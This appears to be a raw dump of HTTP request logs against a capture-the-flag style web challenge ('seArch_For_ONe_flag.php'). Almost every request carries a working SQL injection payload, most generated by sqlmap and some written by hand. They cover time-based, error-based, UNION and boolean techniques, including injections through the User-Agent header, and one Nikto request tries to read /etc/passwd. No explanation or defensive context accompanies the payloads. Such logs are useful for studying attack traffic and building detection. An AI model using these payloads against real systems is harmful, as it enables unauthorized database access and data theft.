Connection: close

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)%')) AND 7337=(SELECT 7337 FROM PG_SLEEP(5))--
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%25%22%29%29%29%3BSELECT%20CASE%20WHEN%202064%3D2885%20THEN%201%20ELSE%20NULL%20END-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%27%20IN%20BOOLEAN%20MODE%29%3BSELECT%20CASE%20WHEN%208830%3D1333%20THEN%201%20ELSE%20NULL%20END-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%25%22%29%29%29%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71627a7871%2C%28SELECT%20%28ELT%285516%3D5516%2C1%29%29%29%2C0x71786b7071%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20AND%20%28%28%28%22%25%22%3D%22 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%25%22%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71627a7871%2C%28SELECT%20%28ELT%285516%3D5516%2C1%29%29%29%2C0x71786b7071%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20AND%20%22%25%22%3D%22 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)') WHERE 9546=9546 OR 3737=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)') WAITFOR DELAY '0:0:5' AND ('bvEC' LIKE 'bvEC
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%29%29%20AND%20%28SELECT%202994%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71627a7871%2C%28SELECT%20%28ELT%282994%3D2994%2C1%29%29%29%2C0x71786b7071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%283284%3D3284 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%22%29%29%20AND%20%28SELECT%202994%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71627a7871%2C%28SELECT%20%28ELT%282994%3D2994%2C1%29%29%29%2C0x71786b7071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%22KxyH%22%3D%22KxyH HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=11-p%22%20AND%20EXTRACTVALUE%288478%2CCONCAT%280x5c%2C0x71627a7871%2C%28SELECT%20%28ELT%288478%3D8478%2C1%29%29%29%2C0x71786b7071%29%29--%20WSji HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)"" PROCEDURE ANALYSE(EXTRACTVALUE(3082,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x7a597968))))),1) AND ""boRa"" LIKE ""boRa
Connection: close

"
"/site/' UNION ALL SELECT FileToClob('/etc/passwd','server')::html,0 FROM sysusers WHERE username=USER --/.html HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000688)
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=11 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=4/%27%29%29%29%3BSELECT%20%28CASE%20WHEN%20%285923%3D7912%29%20THEN%205923%20ELSE%201%2F%28SELECT%200%29%20END%29--/oR//1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.10#stable (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)"")) AS ZZos WHERE 1510=1510 WAITFOR DELAY '0:0:5'-- ubHj
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=3%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20bESa HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.10#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%29%29%20AS%20mjJU%20WHERE%204383%3D4383%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-1860%22%29%20AS%20dViV%20WHERE%202977%3D2977%20UNION%20ALL%20SELECT%202977%2C2977%2C2977%2C2977%2C2977%2C2977%2C2977%2C2977%2C2977%2C2977%23&password=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=13&password=1%29%29%20AS%20qfpm%20WHERE%205598%3D5598%20AND%202169%3D2169--%20bjgT HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%0Aand%0A1%3D1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.4.22#dev (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%27%29%29%20AS%20Lwfq%20WHERE%207533%3D7533%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1/**/union/**/select/**/1,2,3 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=13&password=1%27%29%29%20AS%20gjmW%20WHERE%203831%3D3831%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%283952%3D8824%29%20THEN%201%20ELSE%200x28%20END%29%29--%20oICb HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=13&password=1%22%29%29%20AND%20MAKE_SET%282379%3D2301%2C2301%29%20AND%20%28%28%22vdoz%22%20LIKE%20%22vdoz HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-3024%29%29%29%20UNION%20ALL%20SELECT%204090%2C4090%2C4090%2C4090%2C4090%2C4090%2C4090%2C4090%2C4090%2C4090%2C4090%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20PCDj HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.10#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=4%0aor%0a1=2 HTTP/1.1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.18.4

"
"/f1ag0753.html HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27/***/||/***/1=1-- HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%22%29%20WHERE%209642%3D9642%3BSELECT%20%28CASE%20WHEN%20%287837%3D7082%29%20THEN%207837%20ELSE%201%2F%28SELECT%200%29%20END%29-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-7066%22%29%29%2F%2A%21OR%2A%2F5980%3D7908%2F%2A%21AND%2A%2F%28%28%22qRPE%22%3D%22qRPE&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/.seArch_For_ONe_flag.php.swp?userid=4/**/or/**/1 HTTP/1.1
Content-Length: 0

"
"/seArch_For_ONe_flag.php?userid=-4955%22%29%29%2F%2A%21OR%2A%2F3973%3D5587%2F%2A%21AND%2A%2F%28%28%22ixoZ%22%2F%2A%21LIKE%2A%2F%22ixoZ&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=13&password=1%22%29%20AND%201496%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2873%29%7C%7CCHR%2865%29%7C%7CCHR%28105%29%2C5%29%20AND%20%28%22pths%22%20LIKE%20%22pths HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=13&password=1%22%20WHERE%207316%3D7316%20AND%201496%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28120%29%7C%7CCHR%2873%29%7C%7CCHR%2865%29%7C%7CCHR%28105%29%2C5%29--%20TMqT HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%29%20AND%205069%3DCTXSYS.DRITHSX.SN%285069%2C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285069%3D5069%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29--%20rufX HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%22%29%20WHERE%205195%3D5195%3BSELECT%20%2A%20FROM%20GENERATE_SERIES%281746%2C1746%2CCASE%20WHEN%20%281746%3D1746%29%20THEN%201%20ELSE%200%20END%29%20LIMIT%201-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%27%29%29%29%20AND%209710%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289710%3D9710%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29%20AND%20%28%28%28%27UnfC%27%3D%27UnfC HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=admin%27%20AND%209710%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289710%3D9710%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%29%20AND%20%27HaEX%27%20LIKE%20%27HaEX HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%2B%28SELECT%20%27nHxF%27%20WHERE%203782%3D3782%3BSELECT%20%2A%20FROM%20GENERATE_SERIES%289844%2C9844%2CCASE%20WHEN%20%289844%3D2229%29%20THEN%201%20ELSE%200%20END%29%20LIMIT%201-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-8988%29%20OR%204358%3D4358--%20FgAK&password=123 HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%25%22%29%29%3BIF%282698%3D3378%29%20SELECT%202698%20ELSE%20DROP%20FUNCTION%20NPsx-- HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)')) RLIKE (SELECT (CASE WHEN (6673=5331) THEN 0x73716c6d61702f312e322e372e34236465762028687474703a2f2f73716c6d61702e6f726729 ELSE 0x28 END)) AND (('llDr'='llDr
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%27%29%20AS%20BRmq%20WHERE%203962%3D3962%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20IRIY HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.1#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-3275%25%22%20OR%206642%3D2421--%20GcGT&password=123 HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
X-Forwarded-For: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)"") AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786a71,(SELECT (ELT(5370=5370,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (""GGod"" LIKE ""GGod
Connection: close

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)'+(SELECT nMDn WHERE 2825=2825 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786a71,(SELECT (ELT(5370=5370,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))+'
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-5609%27%20OR%207308%3D%28%27qxvvq%27%7C%7C%28SELECT%20CASE%207308%20WHEN%207308%20THEN%201%20ELSE%200%20END%20FROM%20RDB%24DATABASE%29%7C%7C%27qzvkq%27%29%20OR%20%27gnmO%27%3D%27EByN HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.16#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%22%29%20AS%20Ymrl%20WHERE%205196%3D5196%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20pWcB HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.1#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org)))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178786a71,(SELECT (ELT(3617=3617,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((7449=7449
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%2F%2A%2A%2FYCOw HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.11.19#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=0001%27%27%20AND%20%28SELECT%209557%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716b626b71%2C%28SELECT%20%28ELT%289557%3D9557%2C1%29%29%29%2C0x7170787071%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27WTHu%27%3D%27WTHu HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
X-Forwarded-For: 127.0.0.1
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.7.4#dev (http://sqlmap.org)' AND (SELECT (CASE WHEN (2269=4947) THEN NULL ELSE CAST((CHR(99)||CHR(112)||CHR(87)||CHR(74)) AS NUMERIC) END)) IS NULL AND 'gFnE'='gFnE
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=2 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.18#dev (http://sqlmap.org))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7178786a71,(SELECT (ELT(5749=5749,1))),0x71626a6271,0x78))x)) AND ((4447=4447
Connection: close

"
"/seArch_For_ONe_flag.php?userid=0001%27%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
X-Forwarded-For: 127.0.0.1
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=13&password=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20xXBu HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.5#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%a0%27%0aAND%0a7325%3D7325%0aAND%0a%27TpUe%27%0aLIKE%0a%27TpUe&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%25%27%20AND%204162%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284162%3D4162%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%20AND%20%27%25%27%3D%27 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.3#stable (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%26password%3D1 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: (CASE WHEN 8776=8776 THEN 8776 ELSE NULL END)
Cache-Control: no-cache

"
